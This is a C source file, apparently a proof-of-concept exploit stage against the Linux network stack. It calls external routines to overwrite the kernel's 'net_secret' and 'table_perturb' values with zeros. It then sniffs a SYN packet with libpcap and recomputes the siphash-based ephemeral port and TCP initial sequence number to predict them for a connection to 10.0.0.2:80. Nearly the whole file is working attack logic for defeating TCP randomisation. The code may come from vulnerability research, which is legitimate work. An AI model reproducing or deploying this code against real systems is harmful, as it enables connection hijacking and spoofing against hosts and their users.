#define _GNU_SOURCE
#include <pcap.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <bits/time.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <pcap/pcap.h>
#include <sys/socket.h>
#include "libprimitive.h"
#include "jiffies.h"
#include "siphash.h"

#define SERVER_IP     "10.0.0.2"
#define SERVER_PORT   80

/* Thread communication */
static pthread_mutex_t isn_mutex = PTHREAD_MUTEX_INITIALIZER;
static pthread_cond_t isn_cond = PTHREAD_COND_INITIALIZER;
static u32 client_isn = 0;
static int capture_done = 0;

/* Arguments for the capture thread */
struct cap_thread_args {
  char *interface;
  char *dst_ip;
  char *src_ip;
  int dst_port;
  int src_port;
  pcap_t *pcap_handle;
};

/* Basic ethernet header size */
#define ETH_HDR_SIZE 16

/* Timeout for pcap_open_live/pcap_dispatch */
#define PCAP_TIMEOUT  1000 /* ms */

/* Definitions for guessing ephemeral port */
#define EPHEMERAL_PORT_SHUFFLE_PERIOD (10 * HZ)
#define JIFFY_SKEW_RANGE  (100*HZ)

/* table_perturb size */
#define CONFIG_INET_TABLE_PERTURB_ORDER 16
#define INET_TABLE_PERTURB_SIZE (1 << CONFIG_INET_TABLE_PERTURB_ORDER)

/* We assume that we zap net_secret to {0, 0} */
static const siphash_key_t net_secret_dummy = {0};

#define handle_error(msg) \
  do { perror(msg); exit(EXIT_FAILURE); } while (0)

#define PROC_FILE "/proc/sys/net/ipv4/ip_local_port_range"
#define MAX_LINE_LENGTH 256

static void get_local_port_range(int *low, int *high)
{
    FILE *fp;
    char line[MAX_LINE_LENGTH];

    /* Open proc file */
    if ((fp = fopen(PROC_FILE, "r")) == NULL)
      handle_error("fopen(/proc/sys/net/ipv4/ip_local_port_range)");

    /* Scan the proc file for the low and high port values */
    if (fgets(line, sizeof(line), fp) != NULL) {
        if (sscanf(line, "%d %d", low, high) == 2) {
            printf("[+] Local port range (IPv4): %d -- %d\n", *low, *high);
        } else {
            fclose(fp);
            fprintf(stderr, "[!] Error parsing content of %s\n", PROC_FILE);
            exit(EXIT_FAILURE);
        }
    } else {
        fclose(fp);
        handle_error("fgets()");
    }

    /* Cleanup */
    fclose(fp);
}

static inline u64 get_real_ns(void)
{
  struct timespec ts;
  u64 ns;

  /* Get a timestamp */
  if (clock_gettime(CLOCK_REALTIME, &ts) == -1)
    handle_error("clock_gettime(CLOCK_REALTIME)");
  //if (clock_gettime(CLOCK_MONOTONIC, &ts) == -1)
  //  handle_error("clock_gettime(CLOCK_MONOTONIC)");

  /* Convert it to nanseconds */
  ns = ts.tv_sec * 1000000000LL + ts.tv_nsec;

  /* Return it! */
  return ns;
}

static void pretty_print_tcphdr(const struct tcphdr *tcp_header)
{
    u16 source_port, dest_port;
   // window_size, checksum, urgent_pointer; 
   // u32 sequence_number, ack_number; 
   // u32 data_offset_words; 
   // u32 header_length_bytes;

    if (tcp_header == NULL) {
        printf("Error: TCP header is NULL.\n");
        return;
    }

    /* Convert network byte order to host byte order for relevant fields */
    source_port     =  ntohs(tcp_header->source);
    dest_port       =  ntohs(tcp_header->dest);
   // sequence_number =  ntohl(tcp_header->th_seq);
   // ack_number      =  ntohl(tcp_header->th_ack);
   // window_size     =  ntohs(tcp_header->th_win);
   // checksum        =  ntohs(tcp_header->th_sum);
   // urgent_pointer  =  ntohs(tcp_header->th_urp);

    /* Calculate data offset in 32-bit words and then in bytes */
    //data_offset_words = tcp_header->th_off;
    //header_length_bytes = data_offset_words * 4;

    /* Pretty print it! */
    printf("Source Port: %hu\n", source_port);
    printf("Destination Port: %hu\n", dest_port);
}

static void pkt_handler(u_char *user_args, const struct pcap_pkthdr *pkthdr,
                        const u_char *packet)
{
  const struct iphdr *ip_hdr;
  const struct tcphdr *tcp_hdr;
  u32 ip_hdr_len;
  u32 isn;
  char src_ip_str[INET_ADDRSTRLEN];
  char dst_ip_str[INET_ADDRSTRLEN];
  int src_port;
  int dst_port;

  /* Tranlsate arguments */
  struct cap_thread_args *args = (struct cap_thread_args *)user_args;

  /* Verbose */
  printf("[+][CAP] Found packet!\n");

  /* Quick packet size validation */
  if (pkthdr->len < ETH_HDR_SIZE + sizeof(struct iphdr) + sizeof(struct tcphdr)) {
    printf("[W][CAP] Packet is too small!\n");
    return;
  }

  /* Get the IP header */
  ip_hdr = (const struct iphdr *)(packet + ETH_HDR_SIZE);
  /* Verify that the packet is a TCP packet */
  if (ip_hdr->protocol != IPPROTO_IP && ip_hdr->protocol != IPPROTO_TCP) {
    printf("[W][CAP] Packet protocol (%d) is not TCP!\n", ip_hdr->protocol);
    return;
  }

  /* Get IP header size */
  ip_hdr_len = ip_hdr->ihl * 4 /* bytes */;

  /* Get the TCP header */
  tcp_hdr = (const struct tcphdr *)(packet + ETH_HDR_SIZE + ip_hdr_len);
  pretty_print_tcphdr(tcp_hdr);

  /* Now we check for the SYN flag (w/o ACK so we know it is the ISN) */
  if (tcp_hdr->syn && !tcp_hdr->ack) {
    /* Get the ISN */
    isn = ntohl(tcp_hdr->seq);

    /* Get the source and destination IP/port */
    inet_ntop(AF_INET, &(ip_hdr->saddr), src_ip_str, INET_ADDRSTRLEN);
    inet_ntop(AF_INET, &(ip_hdr->daddr), dst_ip_str, INET_ADDRSTRLEN);
    src_port = ntohs(tcp_hdr->source);
    dst_port = ntohs(tcp_hdr->dest);

    /* Do a quick/light verification */
    printf("[+][CAP] Captured SYN: %s:%d -> %s:%d\n",
            src_ip_str, src_port, dst_ip_str, dst_port);
    printf("[+][CAP] ISN: %u\n", isn);

    /* Relay that we have the ISN */
    pthread_mutex_lock(&isn_mutex);
    if (client_isn == 0) {
      client_isn = isn;
      capture_done = 1;
      pthread_cond_signal(&isn_cond);
    }
    pthread_mutex_unlock(&isn_mutex);

    /* Tell pcap_loop to stop looping */
    pcap_breakloop(args->pcap_handle);
  }
}

static void *cap_thread_func(void *arg)
{
  struct cap_thread_args *args;
  int ret;
  char errbuf[PCAP_ERRBUF_SIZE];
  struct bpf_program prog;
  char filter_exp[256];
  int pkts_read;

  /* Verbose */
  printf("[+][CAP] Running packet capture thread!\n");

  /* Cast the args */
  args = (struct cap_thread_args *)arg;

  /* Open the device for capturing */
  args->pcap_handle = pcap_open_live(args->interface, IP_MAXPACKET, 1,
                                      PCAP_TIMEOUT, errbuf);
  if (args->pcap_handle == NULL) {
    printf("[!][CAP] Error: couldn't open device %s: %s\n",
            args->interface, errbuf);
    pthread_exit(NULL);
  }
  printf("[+][CAP] Opened device (%s) for capture!\n", args->interface);

  // XXX: GC
 // int link_type = pcap_datalink(args->pcap_handle);
 // int link_header_size = 0;

 // switch (link_type) {
 //   case DLT_EN10MB: // Ethernet
 //     link_header_size = 14;
 //     break;
 //   case DLT_LINUX_SLL: // Linux cooked-mode capture (often used for 'any' interface)
 //     link_header_size = 16; // Modern SLL header size
 //                            // For older libpcap/kernels it might be 12. Check your system's DLT_LINUX_SLL_SIZE.
 //     break;
 //   case DLT_NULL: // Loopback on some systems
 //     link_header_size = 4;
 //     break;
 //   case DLT_LOOP: // Loopback on other systems (e.g., BSD)
 //     link_header_size = 4;
 //     break;
 //     // Add other DLT types you might encounter
 //   default:
 //     fprintf(stderr, "[Capture Thread] Unsupported link-layer type: %d. Cannot parse headers.\n", link_type);
 //     pthread_exit(NULL); // Or handle appropriately
 // }
 // printf("datalink size: %d\n", link_header_size);

  /*
   * Create a filter expression that looks for all SYN packets to the
   * destination
   */
  snprintf(filter_exp, sizeof(filter_exp),
          "tcp and tcp[tcpflags] & (tcp-syn) != 0 and dst host %s and dst port %d",
          args->dst_ip, args->dst_port);
  printf("[+][CAP] Generated filter expression:\n  ... %s\n", filter_exp);

  /* Compile the filter expression */
  ret = pcap_compile(args->pcap_handle, &prog, filter_exp, 0, PCAP_NETMASK_UNKNOWN);
  if (ret == PCAP_ERROR) {
    printf("[!][CAP] Error: couldn't parse filter %s: %s\n",
            filter_exp, pcap_geterr(args->pcap_handle));
    pcap_close(args->pcap_handle);
    pthread_exit(NULL);
  }
  printf("[+][CAP] Compiled filter expression!\n");

  /* Set the filter */
  ret = pcap_setfilter(args->pcap_handle, &prog);
  if (ret != 0) {
    if (ret == PCAP_ERROR_NOT_ACTIVATED) {
      printf("[!][CAP] Error: capture handle created but not activated!\n");
    } else if (ret == PCAP_ERROR) {
      printf("[!][CAP] Error: failed to set filter %s: %s\n",
              filter_exp, pcap_geterr(args->pcap_handle));
    } else {
      printf("[!][CAP] Error: unknown error from pcap_setfilter()\n");
    }

    pcap_close(args->pcap_handle);
    pthread_exit(NULL);
  }
  printf("[+][CAP] Filter is installed!\n");

  /* Verbose */
  printf("[+][CAP] Listening for SYN packets...\n");

  /* Loop through packets using pcap_dispatch with a timeout */
  while (!capture_done) {
    pkts_read = pcap_dispatch(args->pcap_handle, -1, (pcap_handler)pkt_handler,
                              (u_char *)args);
    if (pkts_read < 0) { /* Error! */
      if (pkts_read == PCAP_ERROR_NOT_ACTIVATED) {
        printf("[!][CAP] Error: capture handle created but not activated!\n");
      } else if (pkts_read == PCAP_ERROR_BREAK) {
        /* This one is OK and we can expect this */
        break;
      } else if (pkts_read == PCAP_ERROR) {
        printf("[!][CAP] Error: pcap_dispatch() failed: %s\n",
                pcap_geterr(args->pcap_handle));
      } else {
        printf("[!][CAP] Error: unknown error from pcap_dispatch()\n");
      }

      break;
    } else if (pkts_read == 0) { /* No packets arrived within timeout! */
      usleep(50000); /* 50ms */
    }
    /*
     * else pkts_read > 0 and pkt_handler will be called which will either
     * keep us looping or set `capture_done` and break us out of this loop
     */
  }

  /* Cleanup... */
  pcap_freecode(&prog);
  pcap_close(args->pcap_handle);

  printf("[+][CAP] Exiting capture thread.\n");
  pthread_exit(NULL);
}

int main(void)
{
  struct cap_thread_args cap_args;
  pthread_t cap_tid;
  int sockfd;
  struct sockaddr_in server_addr;
  struct sockaddr_in client_addr;
  socklen_t socklen;
  char client_ip[16];
  unsigned int client_port;
  int low, high;
  int local_ports;
  u64 port_offset;
  u32 remaining;
  u32 offset;
  int step;
  int port_guess;
  int found_match;
  unsigned long long jiffies;
  u64 ns_timestamp;
  int i, j;
  u32 seq_hash;
  u32 seq_guess;
  u32 diff;

  /* Setup capture thread */
  cap_args.interface   = "any"; /* capture on all interfaces */
  cap_args.dst_ip      = SERVER_IP;
  cap_args.src_ip      = NULL; /* determined later */
  cap_args.dst_port    = SERVER_PORT;
  cap_args.src_port    = 0; /* determined later */
  cap_args.pcap_handle = NULL; /* determined later */

  /* Start the packet capture thread */
  printf("[+][MAIN] Starting packet capture thread...\n");
  if (pthread_create(&cap_tid, NULL, cap_thread_func, (void *)&cap_args) != 0)
    handle_error("pthread_create()");

  /* Let the thread initialize */
  sleep(1);

  /* Create socket file descriptor */
  if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
    perror("socket()");
    capture_done = 1; /* Signal capture thread to stop */
    pthread_join(cap_tid, NULL);
    exit(EXIT_FAILURE);
  }

  /* Setup server address info */
  server_addr.sin_family = AF_INET;
  server_addr.sin_port = htons(SERVER_PORT);
  if (inet_pton(AF_INET, SERVER_IP, &server_addr.sin_addr) <= 0) {
    perror("inet_pton()");
    close(sockfd);
    capture_done = 1; /* Signal capture thread to stop */
    pthread_join(cap_tid, NULL);
    exit(EXIT_FAILURE);
  }

  /* Verbose */
  printf("[o][MAIN] Connecting to %s:%d...\n", SERVER_IP, SERVER_PORT);

  /* Zap table_perturb */
  trigger_overwrite_of_table_perturb();

  /* Zap net_secret */
  trigger_overwrite_of_net_secret();

  /* Get the jiffies right before we connect */
  jiffies = estimate_jiffies();

  /* Also get a ns timestamp right before we connect */
  ns_timestamp = get_real_ns();
  /*
   * XXX: This ends up making us less accurate. Put it somewhere else.
   * printf("[+][MAIN] Estimated timestamp: %llu\n", ns_timestamp);
   */

  /* Connect to the server */
  if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
    perror("connect()");
    close(sockfd);
    capture_done = 1; /* Signal capture thread to stop */
    pthread_join(cap_tid, NULL);
    exit(EXIT_FAILURE);
  }
  printf("[+][MAIN] Connected to %s:%d\n", SERVER_IP, SERVER_PORT);

  /* Init vars for client info */
  memset(&client_addr, 0, sizeof(struct sockaddr_in));
  memset(client_ip, 0, sizeof(client_ip));
  socklen = sizeof(struct sockaddr_in);

  /* Get client info via getsockname() */
  if (getsockname(sockfd, (struct sockaddr *)&client_addr, &socklen) < 0) {
    perror("getsockname()");
    close(sockfd);
    capture_done = 1; /* Signal capture thread to stop */
    pthread_join(cap_tid, NULL);
    exit(EXIT_FAILURE);
  }
  if (inet_ntop(AF_INET, &client_addr.sin_addr,
        client_ip, sizeof(client_ip)) == NULL) {
    perror("inet_ntop()");
    close(sockfd);
    capture_done = 1; /* Signal capture thread to stop */
    pthread_join(cap_tid, NULL);
    exit(EXIT_FAILURE);
  }
  client_port = ntohs(client_addr.sin_port);

  /* Print out IP/port combos */
  printf("[+][MAIN] Connection info:\n");
  printf("  ... Server IP:   %s\n", SERVER_IP);
  printf("  ... Server port: %d\n", SERVER_PORT);
  printf("  ... Client IP:   %s\n", client_ip);
  printf("  ... Client port: %d\n", client_port);

  /* Wait for the capture thread to find the ISN */
  pthread_mutex_lock(&isn_mutex);
  while (client_isn == 0 && !capture_done) {
    printf("[o][MAIN] Waiting for ISN from capture thread...\n");
    pthread_cond_wait(&isn_cond, &isn_mutex);
  }
  pthread_mutex_unlock(&isn_mutex);

  /* Print out ISN */
  printf("[+][MAIN] Obtained client ISN: %u (%#x)\n", client_isn, client_isn);

  /* Capture loop should break on its own, so we just join here */
  pthread_join(cap_tid, NULL);

  /*
   * Guess the client port
   */

  /* local_ports is 0x0 (false) according to gdb */
  local_ports = 0;

  /* Before diving into things, get the local port ranges and related stuff */
  get_local_port_range(&low, &high);
  high++; /* [32768, 60999] -> [32768, 61000[ */
  remaining = high - low;
  if (!local_ports && remaining > 1)
    remaining &= ~1U;

  /* Get the port step */
  step = local_ports ? 1 : 2;

  /* Guess client port */
  printf("[o][MAIN] Attempting to guess the client port:");
  found_match = 0;

  /*
   * We make multiple guesses to account for discrepencies in the jiffy
   * approximation.
   */
  for (i = 0; i < JIFFY_SKEW_RANGE; i+=EPHEMERAL_PORT_SHUFFLE_PERIOD) {
    /* Verbose print out */
    if (i % 10 == 0) {
      printf("\n  ...");
    }

    /* Get the port offset */
    port_offset = siphash_4u32((u32)client_addr.sin_addr.s_addr,
                              (u32)server_addr.sin_addr.s_addr,
                              (u16)server_addr.sin_port,
                              (jiffies + i) / EPHEMERAL_PORT_SHUFFLE_PERIOD,
                              &net_secret_dummy);
    offset = /* table_perturb[index] = */ 0 + (port_offset >> 32);
    offset %= remaining;

    if (!local_ports)
      offset &= ~1U;

    port_guess = low + offset;

    for (j = 0; j < remaining; j += step, port_guess += step) {
      if (port_guess >= high)
        port_guess -= remaining;
      /*
       * TODO: check if port is reserved and then skip if it is.
       *       For now, just assume the port is not reserved.
       */
    }

    printf(" %d", port_guess);

    /* Check for a match */
    if (port_guess == client_port) {
      found_match = 1;
      printf("\n[+][MAIN] Correctly guessed the port! :)\n");
      printf("  ... Jiffies skew from estimated value: %d\n", i);
      break;
    }
  }

  if (!found_match) {
    printf("\n[!][MAIN] Failed to guess ephemeral port! :(\n");
    goto exit;
  }

  /* Now we guess the sequence number! */
  // printf("[+][MAIN] Getting sequence hash:\n");
  // printf("  ... client addr: %u\n", client_addr.sin_addr.s_addr);
  // printf("  ... server addr: %u\n", server_addr.sin_addr.s_addr);
  // printf("  ... client port: %hu\n", htons(port_guess));
  // printf("  ... server port: %hu\n", server_addr.sin_port);
  seq_hash = (u32)siphash_3u32((u32)client_addr.sin_addr.s_addr,
                               (u32)server_addr.sin_addr.s_addr,
                               (u32)htons(port_guess) << 16 | (u32)server_addr.sin_port,
                               &net_secret_dummy);
  printf("[+][MAIN] Sequence hash: %u (%#x)\n", seq_hash, seq_hash);
  seq_guess = seq_hash + (u32)((ns_timestamp >> 6));
  printf("[?][MAIN] Guessed ISN: %u (%#x)\n", seq_guess, seq_guess);

  /* Calculate and print the diff */
  diff = client_isn - seq_guess;
  printf("[+][MAIN] ISN - Guessed ISN\n");
  printf("  ...      = %u (%#x) - %u (%#x)\n",
          client_isn, client_isn, seq_guess, seq_guess);
  printf("  ...      = %u (%#x)\n", diff, diff);
  printf("[+] Diff: %u\n", diff);

exit:
  /* Close the socket */
  if (close(sockfd) < 0)
    handle_error("close()");
  printf("[+][MAIN] Socket closed successfully!\n");

  /* Success! */
  return EXIT_SUCCESS;
}
